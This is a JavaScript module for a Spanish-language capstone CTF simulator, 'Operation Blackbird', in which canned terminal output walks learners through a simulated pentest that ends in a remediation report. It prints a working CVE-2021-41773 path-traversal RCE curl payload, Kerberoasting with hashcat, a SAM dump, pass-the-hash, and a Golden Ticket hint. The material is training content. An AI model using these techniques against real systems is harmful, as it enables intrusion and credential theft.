/* ============================================================================
   MÓDULO: Capstone CTF - "Operation Blackbird"
   Assessment realista tipo HackTheBox que combina TODOS los conocimientos.
   Escenario: contratado para pentest a "Blackbird Corp".
   Fases: Recon → Initial Access → Lateral Movement → PrivEsc → Exfiltration → Report
============================================================================ */

const initEnv = () => ({
    phase: 'recon',
    target: 'blackbird.corp',
    ip_range: '10.0.0.0/24',
    discovered: { hosts: [], services: [], creds: [], flags: [] },
    shells: [],
    current_user: null,
    domain_admin: false,
    // Estado completo del entorno objetivo
    scope: {
        'blackbird.corp': { ip: '203.0.113.10', type: 'web', public: true, vuln: 'apache_path_traversal' },
        'mail.blackbird.corp': { ip: '203.0.113.11', type: 'mail', public: true, vuln: 'open_relay' },
        'vpn.blackbird.corp': { ip: '203.0.113.12', type: 'vpn', public: true, vuln: 'weak_creds' }
    },
    internal: {
        '10.0.0.10': { hostname: 'WEB01', os: 'Linux Ubuntu', services: [22, 80, 443], vuln: 'CVE-2021-41773', creds: null },
        '10.0.0.20': { hostname: 'DB01', os: 'Linux Ubuntu', services: [22, 3306], vuln: 'reused_password', creds: 'root:Pa$$w0rd2023' },
        '10.0.0.30': { hostname: 'DC01', os: 'Windows Server 2019', services: [88, 135, 389, 445, 3389], vuln: 'kerberoasting', creds: null },
        '10.0.0.40': { hostname: 'FILE01', os: 'Windows Server 2019', services: [445, 3389], vuln: 'smb_share_open', creds: null }
    },
    flags_total: 5,
    flags_found: []
})

const commands = {
    'phase': (args, env) => {
        return {
            out: [
                `=== OPERATION BLACKBIRD - Fase actual: ${env.phase.toUpperCase()} ===`,
                '',
                'Fases del assessment:',
                `  ${env.phase === 'recon' ? '→' : ' '} 1. RECON - Información pública (OSINT, DNS, Shodan)`,
                `  ${env.phase === 'access' ? '→' : ' '} 2. INITIAL ACCESS - Explotar servicios públicos`,
                `  ${env.phase === 'lateral' ? '→' : ' '} 3. LATERAL MOVEMENT - Moverse internamente`,
                `  ${env.phase === 'privesc' ? '→' : ' '} 4. PRIVESC - Escalar a Domain Admin`,
                `  ${env.phase === 'exfil' ? '→' : ' '} 5. EXFILTRATION - Robar las flags (5 totales)`,
                `  ${env.phase === 'report' ? '→' : ' '} 6. REPORT - Escribir el reporte`,
                '',
                `Flags encontradas: ${env.flags_found.length}/${env.flags_total}`,
                `Comando: phase-advance para avanzar a la siguiente fase`
            ]
        }
    },

    'scope': (args, env) => {
        const out = ['=== Scope del Assessment ===', '', 'Targets autorizados:']
        Object.entries(env.scope).forEach(([host, info]) => {
            out.push(`  ${host.padEnd(25)} ${info.ip.padEnd(15)} (${info.type})`)
        })
        out.push('', 'Rango interno: 10.0.0.0/24 (después de obtener acceso inicial)', '',
            '⚠ Reglas:', '  - Solo IPs en scope', '  - No DoS', '  - Reporte al final')
        return { out }
    },

    'recon': (args, env) => {
        const out = [
            '=== Iniciando RECON pasivo ===',
            '',
            '[+] WHOIS blackbird.corp:',
            '    Registrado: 2018-03-15',
            '    Admin email: admin@blackbird.corp',
            '    Nameservers: ns1.blackbird.corp, ns2.blackbird.corp',
            '',
            '[+] DNS enumeration:',
            '    blackbird.corp        → 203.0.113.10 (web)',
            '    mail.blackbird.corp   → 203.0.113.11 (mail)',
            '    vpn.blackbird.corp    → 203.0.113.12 (VPN)',
            '    *.dev.blackbird.corp  → (no encontrado)',
            '',
            '[+] Shodan results:',
            '    203.0.113.10 → Apache 2.4.49 ⚠ (CVE-2021-41773)',
            '    203.0.113.11 → Postfix (open relay sospechoso)',
            '    203.0.113.12 → OpenVPN 2.4 (default config?)',
            '',
            '[+] Empleados en LinkedIn: 87',
            '    Patrón de email: firstname.lastname@blackbird.corp',
            '    Posibles users: j.smith, m.garcia, admin, backup',
            '',
            '[+] GitHub leaks: encontrado repo "blackbird-internal" (deleted)',
            '    Posibles credenciales filtradas: Pa$$w0rd2023, Welcome123',
            '',
            '🎯 Vulnerabilidades identificadas:',
            '   1. Apache 2.4.49 (Path Traversal → RCE)',
            '   2. Posible credencial reutilizada: Pa$$w0rd2023',
            '   3. VPN con config default'
        ]
        const newEnv = structuredClone(env)
        newEnv.discovered.hosts = ['203.0.113.10', '203.0.113.11', '203.0.113.12']
        newEnv.discovered.creds.push('Pa$$w0rd2023 (filtrada en GitHub)')
        return { out, env: newEnv, events: [{ t: 'recon_done' }] }
    },

    'exploit': (args, env) => {
        const target = args[0]
        if (!target) return { out: ['uso: exploit <target>   ej: exploit 203.0.113.10'] }

        if (target === '203.0.113.10') {
            const out = [
                '=== Explotando WEB01 (203.0.113.10) ===',
                '',
                '[*] CVE-2021-41773 - Apache Path Traversal',
                '[*] Payload: curl "http://203.0.113.10/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" --data "echo;id"',
                '',
                '[+] RCE confirmado!',
                '[+] Spawning reverse shell...',
                '[+] Got shell as www-data on WEB01',
                '',
                '🚩 FLAG 1 encontrada: /var/www/html/.flag1',
                '   FLAG{w3b_p0wn3d_v14_p4th_tr4v3rs4l}',
                '',
                'Estás en WEB01 como www-data. Necesitas privesc + explorar la red interna.'
            ]
            const newEnv = structuredClone(env)
            newEnv.phase = 'lateral'
            newEnv.shells.push({ host: 'WEB01', user: 'www-data', ip: '10.0.0.10' })
            newEnv.current_user = 'www-data@WEB01'
            newEnv.flags_found.push('FLAG{w3b_p0wn3d_v14_p4th_tr4v3rs4l}')
            return { out, env: newEnv, events: [{ t: 'initial_access', target }] }
        }

        return { out: [`No hay exploit conocido para ${target}. Investiga más.`] }
    },

    'pivot': (args, env) => {
        if (!env.current_user) return { out: ['Necesitas tener acceso inicial primero. Ejecuta exploit en un target público.'] }

        const out = [
            '=== Pivoting a red interna 10.0.0.0/24 ===',
            '',
            '[*] Escaneo desde WEB01...',
            '[+] Hosts descubiertos:',
            '    10.0.0.10  WEB01 (estás aquí)',
            '    10.0.0.20  DB01 - puertos 22, 3306',
            '    10.0.0.30  DC01 - puertos 88, 135, 389, 445, 3389 (Domain Controller!)',
            '    10.0.0.40  FILE01 - puertos 445, 3389',
            '',
            '[*] Probando credenciales filtradas (Pa$$w0rd2023)...',
            '[+] ssh root@10.0.0.20 con Pa$$w0rd2023 → SUCCESS! ⚠',
            '[+] La contraseña filtrada en GitHub funcionaba para DB01',
            '',
            '🚩 FLAG 2 encontrada: /root/.flag2 en DB01',
            '   FLAG{cr3d3nt14l_st0r4g3_4nd_r3us3_h4ck}',
            '',
            'Lección: empleado pushed credenciales a GitHub público. Las rotan? No.'
        ]
        const newEnv = structuredClone(env)
        newEnv.shells.push({ host: 'DB01', user: 'root', ip: '10.0.0.20' })
        newEnv.flags_found.push('FLAG{cr3d3nt14l_st0r4g3_4nd_r3us3_h4ck}')
        return { out, env: newEnv, events: [{ t: 'lateral_move' }] }
    },

    'enum-ad': (args, env) => {
        if (env.shells.length < 2) return { out: ['Necesitas acceso a la red interna primero. Ejecuta pivot.'] }

        const out = [
            '=== Enumerando Active Directory desde DB01 ===',
            '',
            '[*] Conectando a DC01 (10.0.0.30)...',
            '[*] LDAP query: SearchRequest msg_id=2, base=DC=blackbird,DC=corp',
            '',
            '[+] Usuarios del dominio:',
            '    Administrator    (Domain Admins)',
            '    backup-svc       (Backup Operators) ⚠',
            '    mssql-svc        (Domain Users, SPN: MSSQLSvc/sql.blackbird.corp:1433) 🎯',
            '    iis-svc          (Domain Users, SPN: HTTP/web.blackbird.corp) 🎯',
            '    j.smith, m.garcia, ... (87 usuarios totales)',
            '',
            '[+] Grupos relevantes:',
            '    Domain Admins: Administrator',
            '    Backup Operators: backup-svc',
            '    Enterprise Admins: Administrator',
            '',
            '[+] BloodHound analysis:',
            '    Camino más corto a Domain Admin:',
            '    mssql-svc → SPN kerberoastable → crack hash → privesc',
            '',
            '🎯 SPNs kerberoastables encontrados: 2',
            '🎯 Próximo paso: Invoke-Kerberoast para extraer hashes'
        ]
        return { out, events: [{ t: 'ad_enum' }] }
    },

    'kerberoast': (args, env) => {
        if (env.shells.length < 2) return { out: ['Necesitas estar en la red interna. pivot primero.'] }

        const out = [
            '=== Ejecutando Kerberoasting attack ===',
            '',
            '[*] Solicitando TGS tickets para SPNs kerberoastables...',
            '[+] Hash extraído (mssql-svc):',
            '    $krb5tgs$23$*mssql-svc$BLACKBIRD$mssqlsvc*$abc123def456...',
            '',
            '[*] Crackeando con hashcat + rockyou.txt...',
            '[*] Modo: -m 13100 (Kerberos 5 TGS-REP etype 23)',
            '',
            '[+] HASH CRACKED después de 47 segundos:',
            '    Username: mssql-svc',
            '    Password: SQLAdmin2022!',
            '',
            '[*] Verificando privilegios de mssql-svc...',
            '[+] mssql-svc tiene GenericWrite sobre el grupo "Backup Operators" ⚠',
            '',
            '🚩 FLAG 3 encontrada: en perfil de mssql-svc',
            '   FLAG{k3rb3r04st1ng_g4v3_m3_th3_k3y5}',
            '',
            'Próximo paso: usar mssql-svc para agregar tu cuenta a Backup Operators → privesc'
        ]
        const newEnv = structuredClone(env)
        newEnv.discovered.creds.push('mssql-svc:SQLAdmin2022!')
        newEnv.flags_found.push('FLAG{k3rb3r04st1ng_g4v3_m3_th3_k3y5}')
        return { out, env: newEnv, events: [{ t: 'kerberoast' }] }
    },

    'privesc': (args, env) => {
        if (env.flags_found.length < 3) return { out: ['Necesitas las flags previas. Sigue la cadena de ataque.'] }

        const out = [
            '=== Escalando a Domain Admin ===',
            '',
            '[*] Logueado como mssql-svc',
            '[*] Abusando GenericWrite sobre Backup Operators...',
            '[+] Agregado mi user a Backup Operators',
            '',
            '[*] Backup Operators tiene SeBackupPrivilege en DC01',
            '[*] Esto permite leer cualquier archivo, incluido SAM y SYSTEM',
            '',
            '[+] Copiando SAM y SYSTEM hives de DC01...',
            '[+] Extrayendo hashes con secretsdump.py...',
            '',
            '[+] HASHES OBTENIDOS:',
            '    Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::',
            '    krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d7e2b35eaf42b6cb0573b8e2d4b5e6f7:::',
            '',
            '[*] Pass-the-Hash con Administrator NTLM...',
            '[+] Conectado a DC01 como Administrator!',
            '[+] 👑 ERES DOMAIN ADMIN!',
            '',
            '🚩 FLAG 4 encontrada: C:\\Users\\Administrator\\Desktop\\flag.txt',
            '   FLAG{d0m41n_4dm1n_g0d_m0d3_4ct1v4t3d}',
            '',
            '⚡ Bonus: con el krbtgt hash puedes hacer Golden Ticket (persistencia eterna)'
        ]
        const newEnv = structuredClone(env)
        newEnv.phase = 'exfil'
        newEnv.domain_admin = true
        newEnv.flags_found.push('FLAG{d0m41n_4dm1n_g0d_m0d3_4ct1v4t3d}')
        return { out, env: newEnv, events: [{ t: 'domain_admin' }] }
    },

    'exfil': (args, env) => {
        if (!env.domain_admin) return { out: ['Necesitas ser Domain Admin para la exfiltración final.'] }

        const out = [
            '=== Exfiltración final ===',
            '',
            '[*] Como Domain Admin, accedo a FILE01 (servidor de archivos)',
            '[*] net use Z: \\\\FILE01\\sensitive$',
            '',
            '[+] Archivos sensibles encontrados:',
            '    Z:\\financials\\Q4-2024-results.xlsx (no público todavía)',
            '    Z:\\HR\\salaries-2024.xlsx',
            '    Z:\\IT\\network-diagram.pdf',
            '    Z:\\confidential\\.flag5',
            '',
            '[*] Leyendo .flag5...',
            '',
            '🚩 FLAG 5 encontrada (última):',
            '   FLAG{ex111ltr4t10n_c0mpl3t3_g4m3_0v3r}',
            '',
            '═══════════════════════════════════════════',
            '🏆 ASSESSMENT COMPLETADO - 5/5 FLAGS',
            '═══════════════════════════════════════════',
            '',
            'Resumen del ataque:',
            '  1. RECON: Apache 2.4.49 + credencial en GitHub',
            '  2. INITIAL ACCESS: CVE-2021-41773 → www-data en WEB01',
            '  3. LATERAL: SSH a DB01 con Pa$$w0rd2023 (reutilizada)',
            '  4. KERBEROAST: extracción de hash de mssql-svc',
            '  5. PRIVESC: GenericWrite → Backup Operators → SeBackupPrivilege → SAM dump',
            '  6. DOMAIN ADMIN: Pass-the-Hash con NTLM de Administrator',
            '  7. EXFIL: archivos sensibles desde FILE01',
            '',
            'Próximo paso: ejecuta "report" para generar el reporte ejecutivo'
        ]
        const newEnv = structuredClone(env)
        newEnv.phase = 'report'
        newEnv.flags_found.push('FLAG{ex111ltr4t10n_c0mpl3t3_g4m3_0v3r}')
        return { out, env: newEnv, events: [{ t: 'exfil_done' }] }
    },

    'report': (args, env) => {
        if (env.flags_found.length < 5) return { out: [`Aún faltan flags. Tienes ${env.flags_found.length}/5.`] }

        const out = [
            '═══════════════════════════════════════════════════════',
            '   REPORTE EJECUTIVO - OPERATION BLACKBIRD',
            '═══════════════════════════════════════════════════════',
            '',
            'Cliente: Blackbird Corp',
            'Scope: blackbird.corp, mail.*, vpn.* (3 hosts externos + red interna)',
            'Período: 5 días',
            'Resultado: COMPROMISO TOTAL del dominio Active Directory',
            '',
            '─── HALLAZGOS CRÍTICOS ─────────────────────────────────',
            '',
            '[CRITICAL] CVE-2021-41773 en WEB01',
            '  Apache 2.4.49 sin parche → RCE remoto sin autenticación',
            '  Remediación: Actualizar a Apache 2.4.50+',
            '',
            '[CRITICAL] Credenciales filtradas en GitHub',
            '  Repo público con "Pa$$w0rd2023" funcionaba en producción',
            '  Remediación: Rotar TODAS las credenciales + scan GitHub continuo',
            '',
            '[HIGH] SPNs kerberoastables con passwords débiles',
            '  mssql-svc y iis-svc con passwords crackeables en <1 min',
            '  Remediación: passwords de 25+ chars + AES-256 Kerberos',
            '',
            '[HIGH] Permisos peligrosos en AD (GenericWrite)',
            '  mssql-svc podía modificar Backup Operators',
            '  Remediación: revisar ACLs con BloodHound, principio de mínimo privilegio',
            '',
            '─── RECOMENDACIONES ───────────────────────────────────',
            '',
            '1. Parchar Apache inmediatamente',
            '2. Rotar todas las credenciales que aparecen en GitHub',
            '3. Implementar SIEM con alertas para Kerberoasting',
            '4. Habilitar LAPS para passwords locales',
            '5. Tier model para administración (PAW workstations)',
            '6. Auditar permisos AD trimestralmente con BloodHound',
            '7. Implementar MFA para todas las cuentas privilegiadas',
            '',
            '─── CONCLUSIÓN ────────────────────────────────────────',
            '',
            'Tiempo total para comprometer dominio: 5 horas',
            'Vulnerabilidades base: 4 críticas + 7 altas',
            'Estado actual: ALTO RIESGO',
            '',
            '🎓 Has completado el Capstone CTF.',
            '   Estás listo para HackTheBox y assessments reales.'
        ]
        return { out, events: [{ t: 'report_done' }] }
    },

    'help': () => ({
        out: [
            'Comandos del Capstone CTF:',
            '',
            '  phase          - Ver fase actual y progreso',
            '  scope          - Ver targets autorizados',
            '  recon          - Fase 1: reconnaissance pasivo',
            '  exploit <ip>   - Fase 2: explotar servicio público',
            '  pivot          - Fase 3: moverse a red interna',
            '  enum-ad        - Enumerar Active Directory',
            '  kerberoast     - Atacar SPNs kerberoastables',
            '  privesc        - Fase 4: escalar a Domain Admin',
            '  exfil          - Fase 5: exfiltración final',
            '  report         - Fase 6: generar reporte ejecutivo',
            '',
            'Orden sugerido: recon → exploit 203.0.113.10 → pivot → enum-ad → kerberoast → privesc → exfil → report'
        ]
    })
}

const missions = [
    {
        id: 'cap1', title: 'Reconnaissance inicial', xp: 100,
        brief: 'Todo pentest empieza con OSINT pasivo. Whois, DNS, Shodan, GitHub leaks. Sin tocar el objetivo, sabes su superficie de ataque y posibles credenciales.',
        obj: 'Ejecuta recon completo de blackbird.corp.',
        hint: 'recon',
        check: ev => ev.some(e => e.t === 'recon_done')
    },
    {
        id: 'cap2', title: 'Initial Access - Web exploit', xp: 150,
        brief: 'Apache 2.4.49 tiene CVE-2021-41773 (path traversal → RCE). Es el bug que da entrada al perímetro. Pasas de "internet random" a "shell en red interna".',
        obj: 'Explota WEB01 con el CVE para conseguir shell.',
        hint: 'exploit 203.0.113.10',
        check: ev => ev.some(e => e.t === 'initial_access')
    },
    {
        id: 'cap3', title: 'Lateral Movement con credenciales reutilizadas', xp: 130,
        brief: 'El developer pushed Pa$$w0rd2023 a GitHub. Tres meses después, sigue funcionando en DB01. Esta es la realidad: 60% de los breaches usan credenciales reutilizadas.',
        obj: 'Pivota a la red interna usando las credenciales filtradas.',
        hint: 'pivot',
        check: ev => ev.some(e => e.t === 'lateral_move')
    },
    {
        id: 'cap4', title: 'Active Directory Kerberoasting', xp: 180,
        brief: 'En AD, cualquier usuario autenticado puede pedir tickets TGS para SPNs. Esos tickets se crackean offline. Si el service account tiene password débil → game over.',
        obj: 'Enumera AD primero, luego ejecuta Kerberoasting.',
        hint: 'enum-ad\nkerberoast',
        check: ev => ev.some(e => e.t === 'kerberoast')
    },
    {
        id: 'cap5', title: 'Escalada a Domain Admin', xp: 200,
        brief: 'Cadena clásica: usuario con GenericWrite → agrega a Backup Operators → SeBackupPrivilege → SAM dump → Pass-the-Hash → DA. 5 minutos.',
        obj: 'Escala privilegios hasta Domain Admin.',
        hint: 'privesc',
        check: ev => ev.some(e => e.t === 'domain_admin')
    },
    {
        id: 'cap6', title: 'Exfiltración y reporte ejecutivo', xp: 150,
        brief: 'Un pentest sin reporte = no existió. El cliente paga por el reporte, no por las flags. Aprende a documentar hallazgos, severidad CVSS, y remediación.',
        obj: 'Ejecuta exfil, luego report.',
        hint: 'exfil\nreport',
        check: ev => ev.some(e => e.t === 'report_done')
    }
]

export default {
    id: 'capstone', icon: '🏆', name: 'Capstone CTF - Operation Blackbird', sub: 'Assessment completo end-to-end',
    initEnv,
    prompt: () => 'blackbird-ctf>',
    intro: [
        '═══════════════════════════════════════════════════════',
        '   🏆 CAPSTONE: OPERATION BLACKBIRD',
        '═══════════════════════════════════════════════════════',
        '',
        'CLIENTE: Blackbird Corp',
        'SCOPE: 3 hosts públicos + red interna /24',
        'MISIÓN: Comprometer Domain Admin, capturar 5 flags',
        '',
        'Este es el ASSESSMENT REAL que junta todo lo que aprendiste.',
        'Combina: OSINT + Web + Linux + Windows + AD + Pentesting',
        '',
        'Empieza con: phase  (ver progreso) y luego recon',
        ''
    ],
    commands, missions
}